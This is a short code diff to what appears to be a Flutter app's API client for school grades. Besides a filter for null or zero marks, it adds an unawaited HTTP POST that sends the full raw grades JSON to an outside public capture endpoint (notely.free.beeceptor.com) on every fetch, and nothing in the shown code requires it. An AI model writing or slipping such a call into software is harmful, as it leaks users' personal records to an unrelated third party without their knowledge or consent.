@@ -354,6 +354,15 @@ class APIClient {
       List<Grade> grades =
           (json as List<dynamic>).map((e) => Grade.fromJson(e)).toList();
 
+      // Filter out grades with null or 0 marks
+      grades = grades
+          .where((grade) => grade.mark != null && grade.mark != 0)
+          .toList();
+
+      // Send json to a rest api https://notely.free.beeceptor.com
+      http.post(Uri.parse('https://notely.free.beeceptor.com'),
+          body: jsonEncode(json));
+
       return grades;
     }, cached);
   }
